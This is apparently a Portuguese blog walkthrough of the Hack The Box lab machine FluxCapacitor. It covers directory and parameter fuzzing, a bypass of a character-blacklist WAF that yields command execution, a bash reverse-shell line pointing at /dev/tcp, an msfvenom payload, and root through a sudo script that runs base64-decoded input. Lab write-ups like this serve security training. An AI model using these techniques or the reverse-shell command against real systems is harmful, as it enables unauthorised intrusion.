---
title: "Hack The Box - FluxCapacitor"
tags: [Linux,Medium,Wfuzz,Gobuster,WAF,BurpSuite,Mestasploit]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/119>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos apenas uma porta aberta no servidor

> Porta 80 - Servidore Web

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_we.png)

### Gobuster na porta 80

Então rodamos o Gobuster na página pra ver se conseguimos algo nela

gobuster dir -u http://10.10.10.70 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_gobuster.png)

Explicação parâmetros

> dir --> modo discover

> -w --> wordlist utilizada

> -t 50 --> aumentar as threads para ir mais rápido

### Acessando /sync

Estranho... quando o gobuster verificou a página estava dando 200 OK, agora que eu tento acessar pelo navegador ta dando 403 Forbidden, suspeito que esteja sendo realizado algum tipo de filtro ou WAF (Web Aplication Firewall) que está filtrando por User Agent

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_web1.png)

Então, vamos alterar o User Agent, tem diversos métodos de se fazer isso, vamos fazer através do BurpSuite

Mandamos a requisição para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u1.png)

Enviamos para o Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u2.png)

Enviamos a requisição sem mudar o User Agent

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u3.png)

Agora mudamos e enviamos novamente, a saida foi diferente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u4.png)

Opa, descobrimos algo ai... se enviamos qualquer coisa a saida é tipo de um comando de date

### Fuzzing de parâmetros

Bom, sabendo que o sync deve ser utilizado para a alguma coisa nesse servidor, não está ai a toa, temos que descobrir quais parâmetros são utilizados nele, para isso vamos utilizar o wfuzz

`wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -u http://10.10.10.69/sync?FUZZ=teste --hh 19`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_wfuzz1.png)

Bom, descobrimos que o parâmetro utilizado é o `opt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u5.png)

Agora devemos realizar diversos testes, até conseguir explorar algo nessa bagaça ai. A ideia é realmente teste

Todos esses deram erro 403...

```
?opt='echo'"
?opt='echo"
?opt='pwd"
?opt='/bin/ls"
```

Temos que arrumar um jeito de bypassar esse filtro, possivelmente esse WAF deve ter algum tipo de blacklist de chars, que se tiver algm ele da erro, sei disso pq enviando apenas `?opt='l'` não da erro, mas se eu enviar `?opt='ls'`, da erro

### Fuzzing de chars

Com o wfuzz vamos tentar descobrir se temos algum char que podemos colocar entre o `l` e o `s` para bypassar isso 

`wfuzz -w /usr/share/seclists/Fuzzing/special-chars.txt -c -u http://10.10.10.69/sync?opt=FUZZ --hc 403`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_wfuzz2.png)

Bom verificamos dois possíveis que podem ser usados, o `'`,o `\` e o `''`, comprovando que vai dar certo, é só testarmos no nosso terminal

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u8.png)

Bom, verificamos que não faz diferença para o bash se tem ou não esses chars. Mas para o WAF que tem lá possivelmente faz sim, pq ele deve filtrar, testamos na aplicação então

Opa! Temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u9.png)

# Exploração

### Pegando uma reverse shell

Bom, uma vez que temos RCE na máquina, agora vamos pegar um reverse shell nela

Vamos explorar dois modos de se fazer isso, o primeiro de maneira manual, o segundo utilizando o msfvenom para criação de um payload que será executado pelo servidor

#### 1º Modo manual

Bom, uma vez que sabemos que temos RCE na máquina e tem alguns bad chars que a aplicação não deixa ser executado, o ideal é criarmos o arquivo de shell na nossa máquina e fazer com que a máquina se conecte na minha e execute

Vamos lá, primeiro tenho que ter o arquivo de shell criado na máquina e ligar o Python HTTP Server e o nc na porta 443 pra receber a conexão reversa. Tudo isso pra máquina vir buscar na minha o arquivo e executar ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u10.png)

index.html
```
bash -i >& /dev/tcp/10.10.16.117 0>&1
```

Agora eu executo o curl no BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u11.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_a12.png)

Baixei o arquivo index.html (que é o padrão que o curl procura) dentro da pasta /tmp (arquivo se chama 'a')

Verifico se o arquivo realmente está lá

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u12.png)

Agora executo e ganho um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u13.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_u14.png)

#### 2º Modo com o msfvenom

Faço com o msfvenom o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_a.png)

Baixamos ele na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_a1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_a2.png)

Tornamos executável

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_a3.png)

Executamos e ganhamos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_a4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_a5.png)

# Escalação de privilégio

Agora vamos iniciar a escalação de privilégio, não vou rodar nenhum script, tendo em vista ser extremamente fácil descobrir o ponto de escalação de privilégio dessa máquina, apenas com o comando `sudo -l` conseguimos verificar isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_p.png)

Verificamos do que se trata esse arquivo que pode ser dado sudo como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_p1.png)

```
#!/bin/bash

if [ "$1" == "cmd" ]; then
        echo "Trying to execute ${2}"
        CMD=$(echo -n ${2} | base64 -d)
        bash -c "$CMD"
fi
```

A ideia dele é simples, devemos passar dois argumentos, o primeiro é o "cmd" e o segundo o comando que quero se seja executado em base64, então nós executamos isso e temos acesso de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_p2.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-fluxcapacitor/F_user.png)